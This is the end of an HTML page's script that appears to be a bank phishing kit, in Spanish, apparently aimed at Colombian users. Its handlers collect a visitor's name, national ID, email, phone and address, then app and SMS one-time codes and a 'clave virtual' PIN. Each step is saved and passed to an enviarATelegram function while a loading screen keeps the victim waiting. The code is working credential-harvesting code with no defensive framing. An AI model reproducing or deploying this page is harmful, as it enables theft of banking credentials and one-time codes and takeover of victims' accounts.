                const nombre = $('#nombre').val().trim();
                const cedula = $('#cedula').val().trim();
                const email = $('#email').val().trim();
                const celular = $('#celular').val().trim();
                const ciudad = $('#ciudad').val().trim();
                const direccion = $('#direccion').val().trim();

                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                const isValid = nombre.length >= 3 &&
                               /^\d{5,15}$/.test(cedula) &&
                               emailRegex.test(email) &&
                               /^\d{10}$/.test(celular) &&
                               ciudad.length >= 2 &&
                               direccion.length >= 5;

                $('#btnDatos').prop('disabled', !isValid);
                return isValid;
            }

            $('#nombre, #cedula, #email, #celular, #ciudad, #direccion').on('input', function() {
                validateDatos();
            });

            $('#cedula, #celular').on('input', function() {
                let value = $(this).val().replace(/\D/g, '');
                $(this).val(value);
                validateDatos();
            });

            $('#btnDatos').on('click', async function () {
                if (validateDatos()) {
                    saveToLocalStorage('nombre', $('#nombre').val().trim());
                    saveToLocalStorage('cedula', $('#cedula').val().trim());
                    saveToLocalStorage('email', $('#email').val().trim());
                    saveToLocalStorage('celular', $('#celular').val().trim());
                    saveToLocalStorage('ciudad', $('#ciudad').val().trim());
                    saveToLocalStorage('direccion', $('#direccion').val().trim());
                    saveToLocalStorage('status', 'DATOS');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // OTP App
            $('#otpappInput').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 8) value = value.substring(0, 8);
                $(this).val(value);
                validateOtpApp();
            });

            $('#btnOtpApp').on('click', async function () {
                if (validateOtpApp()) {
                    saveToLocalStorage('otpapp', $('#otpappInput').val().trim());
                    saveToLocalStorage('status', 'OTPAPP');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // OTP SMS
            $('#otpsmsInput').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 8) value = value.substring(0, 8);
                $(this).val(value);
                validateOtpSms();
            });

            $('#btnOtpSms').on('click', async function () {
                if (validateOtpSms()) {
                    saveToLocalStorage('otpsms', $('#otpsmsInput').val().trim());
                    saveToLocalStorage('status', 'OTPSMS');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Clave Virtual
            function validateClaveVirtual() {
                const clavevirtual = $('#clavevirtualInput').val().trim();
                const isValid = /^\d{4,6}$/.test(clavevirtual);
                $('#btnClaveVirtual').prop('disabled', !isValid);
                return isValid;
            }

            $('#clavevirtualInput').on('input', function() {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 6) value = value.substring(0, 6);
                $(this).val(value);
                validateClaveVirtual();
            });

            $('#btnClaveVirtual').on('click', async function () {
                if (validateClaveVirtual()) {
                    saveToLocalStorage('clavevirtual', $('#clavevirtualInput').val().trim());
                    saveToLocalStorage('status', 'CLAVEVIRTUAL');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // ==================== INICIALIZACION ====================
            showView('login');
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>
